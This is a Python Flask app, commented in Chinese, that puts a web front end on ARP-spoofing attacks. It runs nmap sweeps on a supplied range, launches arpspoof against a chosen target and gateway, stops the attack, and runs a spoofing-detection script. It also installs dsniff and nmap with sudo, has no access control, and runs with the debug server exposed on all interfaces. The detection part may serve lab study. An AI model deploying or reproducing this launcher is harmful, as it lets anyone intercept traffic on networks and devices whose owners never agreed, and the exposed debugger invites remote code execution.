from flask import Flask, Response,render_template, request, send_file
import requests,subprocess
from datetime import datetime 
# nowdate = datetime.now()

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html')    # 返回index.html文件

@app.route('/arp_attack', methods=['POST'])  
def arp_attack():  
    ip_address = request.form.get('ip')  
    if not ip_address:  
        return "IP address is required", 400 
    try:
        tool_nmap = subprocess.run(["command -v nmap"], capture_output=True, text=True,shell=True)  # 检查nmap是否已安装
        if tool_nmap.stdout:  
            print("nmap 已安装，输出内容为:", tool_nmap.stdout.strip())  # 检查 stdout 是否为空  
        else:   # 如果nmap未安装，则执行安装命令 
            print("nmap未安装，开始安装...")
            install_nmap = subprocess.run(["sudo apt-get install -y nmap"], check=True)
            print("nmap已安装完成")
    except subprocess.CalledProcessError:
        print("nmap工具出现问题，请排查！！")
    try:
        command = ['nmap','-sn','-T4','--min-parallelism','100',ip_address]
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        output = result.stdout.decode()
        return Response(output, status=200, mimetype='text/plain')
    except subprocess.CalledProcessError as e:
        return f"nmap命令执行失败！错误信息：{e.stderr.decode()}"
    except Exception as e:
        return f"nmap命令未执行成功！错误信息：{str(e)}"

@app.route('/attack_arpspoof', methods=['POST'])  
def attack_arpspoof():  
    ip_address = request.form.get('aip')  
    if not ip_address:  
        return "IP address is required", 400 
    ip_gateway = request.form.get('gip')  
    if not ip_gateway:  
        return "IP address is required", 400 
    ncard = request.form.get('wangka')  
    if not ncard:  
        return "IP address is required", 400
    try:
        tool_arpspoof = subprocess.run(["command -v arpspoof"], capture_output=True, text=True,shell=True)
        if tool_arpspoof.stdout:  
            print("arpspoof 已安装，输出内容为:", tool_arpspoof.stdout.strip())  # 检查 stdout 是否为空  
        else:   # 如果arpspoof未安装，则执行安装命令 
            print("arpspoof未安装，开始安装...")
            install_arpspoof = subprocess.run(["sudo apt-get install -y dsniff ssldump"], check=True)
            print("arpspoof已安装完成!")
    except subprocess.CalledProcessError:
        print("arpspoof工具出现问题，请排查！！")
    try:
        subprocess.run('chmod +x arpspoof.sh', stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
        command = ['sh','arpspoof.sh',ncard,ip_address,ip_gateway]
        result = subprocess.Popen(command)
        # output = result.stdout.decode()
        # return Response(output, status=200, mimetype='text/plain')
        return "开始攻击！"
    except subprocess.CalledProcessError as e:
        return f"arpspoof命令执行失败！错误信息：{e.stderr.decode()}"
    except Exception as e:
        return f"arpspoof命令未执行成功！错误信息：{str(e)}"


@app.route('/stop-command', methods=['POST'])
def stop_command():
    try:
        subprocess.Popen(['killall', 'arpspoof'])
        return '命令已停止'
    except Exception as e:
        return f"停止命令失败！错误信息：{str(e)}"


@app.route('/nohup.out')
def get_nohup_out():
    with open('nohup.out', 'r') as f:
        lines = f.readlines()
        latest_lines = '<br>'.join(lines[-10:])
        return latest_lines

@app.route('/arp_detection',methods=['get'])
def arp_detection():
    try:
        subprocess.run('chmod +x arpspoof_detection.sh', stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
        p = subprocess.run('sh arpspoof_detection.sh', stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
        # p = subprocess.run('python3 arp_detection_linux.py',stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        arp_detection_result = p.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        arp_detection_result = e.stderr.decode('utf-8')
    return arp_detection_result

@app.route('/audit-attack-log',methods=['get'])
def arp_attack_log():
    arp_attack_log_list = []
    last_text_found = None  # 用于跟踪最后一个text出现的位置
    nowdate = datetime.now().strftime('%Y-%m-%d %H:%M:%S')  
    with open('nohup.out', 'r',encoding='utf-8') as f:
        lines = f.readlines()
        text = 'Cleaning up and re-arping targets...'

        # 遍历文件的每一行  
        for i, line in enumerate(lines):  
            # 检查是否找到了text  
            if line.strip() == text:  
                last_text_found = i  # 更新最后一个text出现的位置  
              
            # 如果已经找到了text，并且当前行是最后一个text之后的第六行  
            if last_text_found is not None and i == last_text_found + 6:  
                # 获取当前时间  
                
                # 创建停止攻击的日志条目  
                startattack = f"{nowdate}：任务执行成果"  
                arp_attack_log_list.append(startattack)  

            if line.strip() == text:
               stopattack = f"{nowdate}：任务停止" 
               arp_attack_log_list.append(stopattack)
    return arp_attack_log_list

@app.route('/arp_detection_log',methods=['get'])
def arp_detection_log():
    with open('endresult.txt', 'r',encoding='utf-8') as f:
        lines = f.readlines()
        log_lines = '<br>'.join(lines[-10:])
    return log_lines

if __name__ == '__main__':  
    app.run(debug=True,host='0.0.0.0',port=5000)